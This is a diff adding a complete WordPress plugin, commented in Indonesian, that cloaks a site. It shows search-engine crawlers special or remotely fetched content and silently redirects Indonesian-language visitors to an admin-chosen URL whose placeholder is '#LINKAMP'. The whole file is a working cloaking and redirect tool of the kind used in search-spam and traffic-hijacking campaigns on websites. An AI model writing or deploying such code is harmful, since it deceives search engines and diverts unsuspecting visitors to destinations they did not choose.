@@ -1,0 +1,257 @@
+<?php
+/*
+Plugin Name: WP Cloaking & Redirect Manager
+Description: Plugin cloaking multi fungsi dengan bot detection, redirect bahasa, cookie control, dan panel admin untuk pengaturan mudah.
+Version: 1.1
+Author: ChatGPT
+*/
+
+if (!defined('ABSPATH')) {
+    exit; // Prevent direct access
+}
+
+class WPCloakingPlugin {
+
+    private $option_name = 'wp_cloaking_settings';
+
+    public function __construct() {
+        add_action('init', array($this, 'handle_cloaking_redirect'));
+        add_action('admin_menu', array($this, 'add_admin_menu'));
+        add_action('admin_init', array($this, 'register_settings'));
+    }
+
+    /**
+     * Fungsi utama: cloaking dan redirect sesuai aturan.
+     */
+    public function handle_cloaking_redirect() {
+        if (is_admin()) return; // Jangan jalan di halaman admin
+
+        $settings = get_option($this->option_name);
+
+        if (empty($settings['enabled'])) {
+            return; // Plugin disable, skip
+        }
+
+        $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+        $request_uri = $_SERVER['REQUEST_URI'] ?? '/';
+        $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
+        $cookie_name = $settings['cookie_name'] ?? 'az';
+        $cookie_value = $_COOKIE[$cookie_name] ?? '';
+        $upgrade_insecure_requests = $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] ?? '';
+
+        $is_bot = $this->is_bot($user_agent);
+
+        if ($is_bot && $request_uri === '/') {
+            // Cek kondisi sesuai script awal
+            if (
+                strpos($accept_lang, 'zh') !== false &&
+                $upgrade_insecure_requests == 1 &&
+                $cookie_value === 'lp'
+            ) {
+                // Perpanjang cookie
+                setcookie($cookie_name, 'lp', time() + 3600 * 7200, COOKIEPATH, COOKIE_DOMAIN);
+
+                // Tampilkan konten khusus bot dari setting
+                echo $settings['bot_content'] ?? ' ';
+                exit;
+            }
+
+            // Tampilkan konten fallback dari URL jika ada
+            if (!empty($settings['bot_fallback_content_url'])) {
+                $response = wp_remote_get($settings['bot_fallback_content_url']);
+                if (!is_wp_error($response)) {
+                    echo wp_remote_retrieve_body($response);
+                    exit;
+                }
+            }
+        }
+
+        // Redirect user biasa berdasar bahasa browser
+        $browserLang = substr($accept_lang, 0, 2);
+        if ($browserLang === 'id' && !headers_sent()) {
+            wp_redirect($settings['redirect_url'] ?? '#LINKAMP', 302);
+            exit;
+        }
+    }
+
+    /**
+     * Deteksi bot dari user agent (daftar bot populer + cek 'bot' umum).
+     */
+    private function is_bot($user_agent) {
+        $bots = [
+            'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
+            'yandexbot', 'sogou', 'exabot', 'facebot', 'facebookexternalhit',
+            'ia_archiver', 'applebot', 'telegrambot'
+        ];
+
+        foreach ($bots as $bot) {
+            if (strpos($user_agent, $bot) !== false) {
+                return true;
+            }
+        }
+
+        // Cek kata 'bot' umum
+        if (strpos($user_agent, 'bot') !== false) {
+            return true;
+        }
+
+        return false;
+    }
+
+    /**
+     * Tambah menu admin di Settings > WP Cloaking
+     */
+    public function add_admin_menu() {
+        add_options_page(
+            'WP Cloaking Settings',
+            'WP Cloaking',
+            'manage_options',
+            'wp-cloaking-settings',
+            array($this, 'settings_page')
+        );
+    }
+
+    /**
+     * Register setting dan fields untuk page admin
+     */
+    public function register_settings() {
+        register_setting($this->option_name, $this->option_name, array($this, 'sanitize_settings'));
+
+        add_settings_section(
+            'wp_cloaking_main',
+            'Pengaturan Cloaking & Redirect',
+            null,
+            $this->option_name
+        );
+
+        add_settings_field(
+            'enabled',
+            'Enable Plugin',
+            array($this, 'field_enabled'),
+            $this->option_name,
+            'wp_cloaking_main'
+        );
+
+        add_settings_field(
+            'cookie_name',
+            'Nama Cookie',
+            array($this, 'field_cookie_name'),
+            $this->option_name,
+            'wp_cloaking_main'
+        );
+
+        add_settings_field(
+            'bot_content',
+            'Konten Bot Khusus',
+            array($this, 'field_bot_content'),
+            $this->option_name,
+            'wp_cloaking_main'
+        );
+
+        add_settings_field(
+            'bot_fallback_content_url',
+            'URL Konten Fallback Bot',
+            array($this, 'field_bot_fallback_content_url'),
+            $this->option_name,
+            'wp_cloaking_main'
+        );
+
+        add_settings_field(
+            'redirect_url',
+            'URL Redirect User',
+            array($this, 'field_redirect_url'),
+            $this->option_name,
+            'wp_cloaking_main'
+        );
+    }
+
+    /**
+     * Sanitasi input dari form admin
+     */
+    public function sanitize_settings($input) {
+        $new_input = [];
+
+        $new_input['enabled'] = !empty($input['enabled']) ? 1 : 0;
+        $new_input['cookie_name'] = sanitize_text_field($input['cookie_name'] ?? 'az');
+        $new_input['bot_content'] = wp_kses_post($input['bot_content'] ?? '');
+        $new_input['bot_fallback_content_url'] = esc_url_raw($input['bot_fallback_content_url'] ?? '');
+        $new_input['redirect_url'] = esc_url_raw($input['redirect_url'] ?? '#LINKAMP');
+
+        return $new_input;
+    }
+
+    /**
+     * Field: Enable Plugin checkbox
+     */
+    public function field_enabled() {
+        $options = get_option($this->option_name);
+        ?>
+        <input type="checkbox" name="<?php echo esc_attr($this->option_name); ?>[enabled]" value="1" <?php checked(1, $options['enabled'] ?? 0); ?>>
+        <p class="description">Centang untuk mengaktifkan plugin cloaking dan redirect.</p>
+        <?php
+    }
+
+    /**
+     * Field: Cookie Name
+     */
+    public function field_cookie_name() {
+        $options = get_option($this->option_name);
+        ?>
+        <input type="text" name="<?php echo esc_attr($this->option_name); ?>[cookie_name]" value="<?php echo esc_attr($options['cookie_name'] ?? 'az'); ?>" >
+        <p class="description">Nama cookie yang digunakan untuk cloaking, default: <code>az</code>.</p>
+        <?php
+    }
+
+    /**
+     * Field: Bot Content (textarea)
+     */
+    public function field_bot_content() {
+        $options = get_option($this->option_name);
+        ?>
+        <textarea rows="6" cols="60" name="<?php echo esc_attr($this->option_name); ?>[bot_content]"><?php echo esc_textarea($options['bot_content'] ?? ''); ?></textarea>
+        <p class="description">Isi konten khusus yang tampil untuk bot (boleh HTML).</p>
+        <?php
+    }
+
+    /**
+     * Field: Bot fallback content URL
+     */
+    public function field_bot_fallback_content_url() {
+        $options = get_option($this->option_name);
+        ?>
+        <input type="url" name="<?php echo esc_attr($this->option_name); ?>[bot_fallback_content_url]" value="<?php echo esc_url($options['bot_fallback_content_url'] ?? ''); ?>" size="50">
+        <p class="description">URL konten fallback untuk bot jika tidak ada konten khusus.</p>
+        <?php
+    }
+
+    /**
+     * Field: Redirect URL for normal user
+     */
+    public function field_redirect_url() {
+        $options = get_option($this->option_name);
+        ?>
+        <input type="url" name="<?php echo esc_attr($this->option_name); ?>[redirect_url]" value="<?php echo esc_url($options['redirect_url'] ?? '#LINKAMP'); ?>" size="50">
+        <p class="description">URL tujuan redirect visitor biasa (misal: https://contoh.com).</p>
+        <?php
+    }
+
+    /**
+     * Render halaman settings plugin
+     */
+    public function settings_page() {
+        ?>
+        <div class="wrap">
+            <h1>WP Cloaking & Redirect Settings</h1>
+            <form method="post" action="options.php">
+                <?php
+                settings_fields($this->option_name);
+                do_settings_sections($this->option_name);
+                submit_button('Simpan Pengaturan');
+                ?>
+            </form>
+        </div>
+        <?php
+    }
+}
+
+new WPCloakingPlugin();
